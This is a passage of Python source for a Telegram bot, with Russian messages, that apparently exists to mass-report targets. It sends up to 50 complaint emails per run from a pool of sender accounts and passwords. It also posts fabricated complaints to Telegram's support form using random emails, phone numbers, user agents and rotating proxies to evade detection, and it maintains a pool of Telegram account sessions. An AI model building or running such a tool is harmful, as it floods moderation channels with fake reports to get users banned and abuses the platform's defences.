        await message.answer('🔢 Введите количество отправок (не больше 50):')
        await state.set_state(ComplaintStates.count)
    else:
        await message.answer('❌ Неверный ввод. Пожалуйста, ответьте "Да" или "Нет":')

@dp.message(ComplaintStates.photos)
async def process_photos_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
        return
    
    if message.photo:
        # Сохраняем file_id фото вместо загрузки
        photo_file_id = message.photo[-1].file_id
        await state.update_data(photos=[photo_file_id])
        await message.answer('🔢 Введите количество отправок (не больше 50):')
        await state.set_state(ComplaintStates.count)
    else:
        await message.answer('❌ Пожалуйста, отправьте фотографию')

@dp.message(ComplaintStates.count)
async def process_count_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
        return
    
    try:
        count = int(message.text)
        if count > 50:
            await message.answer('🚫 Количество отправок не должно превышать 50. Повторите ввод:')
            return
    except ValueError:
        await message.answer('🔢 Пожалуйста, введите число. Повторите ввод:')
        return
    
    data = await state.get_data()
    subject = data['subject']
    body = data['body']
    photos = data.get('photos')
    
    for _ in range(count):
        receiver = random.choice(receivers)
        sender_email, sender_password = random.choice(list(senders.items()))
        success, result_message = await send_email(receiver, sender_email, sender_password, subject, body, photos)
        if success:
            photo_status = 'с фотографией' if photos else 'без фотографии'
            await message.answer(f'✅ Письмо успешно отправлено на [{receiver}] от [{sender_email}]\nС текстом: {body}\nОтправитель: [{sender_email}]\n{photo_status}')
        else:
            await message.answer(result_message)
    
    await state.clear()

@dp.message(ComplaintStates.text_for_site)
async def process_text_for_site_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
        return
    
    await state.update_data(text_for_site=message.text)
    await message.answer('🔢 Введите количество отправок (не больше 50):')
    await state.set_state(ComplaintStates.count_for_site)

@dp.message(ComplaintStates.count_for_site)
async def process_count_for_site_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
        return
    
    try:
        count = int(message.text)
        if count > 50:
            await message.answer('🚫 Количество отправок не должно превышать 50. Повторите ввод:')
            return
    except ValueError:
        await message.answer('🔢 Пожалуйста, введите число. Повторите ввод:')
        return
    
    data = await state.get_data()
    text = data['text_for_site']
    
    for _ in range(count):
        email = random.choice(mail)
        phone = random.choice(phone_numbers)
        proxy = await get_working_proxy()
        if not proxy:
            await message.answer('❌ В данный момент отсутствуют работоспособные прокси для отправки.')
            break
        success = await send_to_site(text, email, phone, proxy)
        if success:
            await message.answer(f'✅ Жалоба отправлена: {text} 📨📮\nПочта [{email}] номер [{phone}]')
        else:
            await message.answer('❌ Ошибка при отправке жалобы.')
    
    await state.clear()

async def get_working_proxy():
    for proxy in proxies:
        try:
            response = requests.get('https://www.google.com', proxies=proxy, timeout=5)
            if response.status_code == 200:
                return proxy
        except Exception as e:
            logging.error(f'Proxy {proxy} is not working: {e}')
    return None

async def send_to_site(text, email, phone, proxy):
    url = "https://telegram.org/support"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": random.choice(user_agents)
    }
    data = {
        "message": text,
        "email": email,
        "phone": phone,
        "setln": "ru"
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=10)
        if response.status_code == 200:
            logging.info(f'Data sent to site: {text}, email: {email}, phone: {phone}')
            return True
        else:
            logging.error(f'Error sending data to site: {response.status_code}')
            return False
    except Exception as e:
        logging.error(f'Error sending data to site: {e}')
        return False

@dp.message(SupportStates.message)
async def process_support_message(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
        return
    
    username = message.from_user.username or f'id{user_id}'
    content_type = message.content_type
    text = message.text or message.caption

    if content_type == 'text':
        await bot.send_message(admin_chat_id, f'Сообщение от @{username} (ID: {user_id}):\n\n{text}')
    elif content_type == 'photo':
        await bot.send_photo(admin_chat_id, message.photo[-1].file_id, caption=f'Сообщение от @{username} (ID: {user_id}):\n\n{text}')
    elif content_type == 'document':
        await bot.send_document(admin_chat_id, message.document.file_id, caption=f'Сообщение от @{username} (ID: {user_id}):\n\n{text}')
    elif content_type == 'audio':
        await bot.send_audio(admin_chat_id, message.audio.file_id, caption=f'Сообщение от @{username} (ID: {user_id}):\n\n{text}')
    elif content_type == 'voice':
        await bot.send_voice(admin_chat_id, message.voice.file_id, caption=f'Сообщение от @{username} (ID: {user_id}):\n\n{text}')
    elif content_type == 'video':
        await bot.send_video(admin_chat_id, message.video.file_id, caption=f'Сообщение от @{username} (ID: {user_id}):\n\n{text}')
    elif content_type == 'video_note':
        await bot.send_video_note(admin_chat_id, message.video_note.file_id, caption=f'Сообщение от @{username} (ID: {user_id}):\n\n{text}')

    await message.answer('✅ Ваше сообщение отправлено в поддержку.')
    await state.clear()

async def check_and_clean_sessions():
    session_files = [f for f in os.listdir(session_dir) if f.endswith('.session')]
    for session_file in session_files:
        session_path = os.path.join(session_dir, session_file)
        client = TelegramClient(session_path, api_id=api_id, api_hash=api_hash)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                logging.info(f"Сессия {session_file} не авторизована. Удаляем.")
                os.remove(session_path)
        except errors.AuthKeyDuplicatedError:
            logging.error(f"Сессия {session_file} была использована под разными IP-адресами. Удаляем.")
            os.remove(session_path)
        except errors.FloodWaitError as e:
            logging.warning(f"FloodWaitError для сессии {session_file}: {e}. Повтор через {e.seconds} секунд.")
            await asyncio.sleep(e.seconds)
        except Exception as e:
            logging.error(f"Ошибка при проверке сессии {session_file}: {e}")
            os.remove(session_path)
        finally:
            try:
                await client.disconnect()
            except Exception as e:
                logging.error(f"Ошибка при отключении сессии {session_file}: {e}")

async def main():
    await check_and_clean_sessions()
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())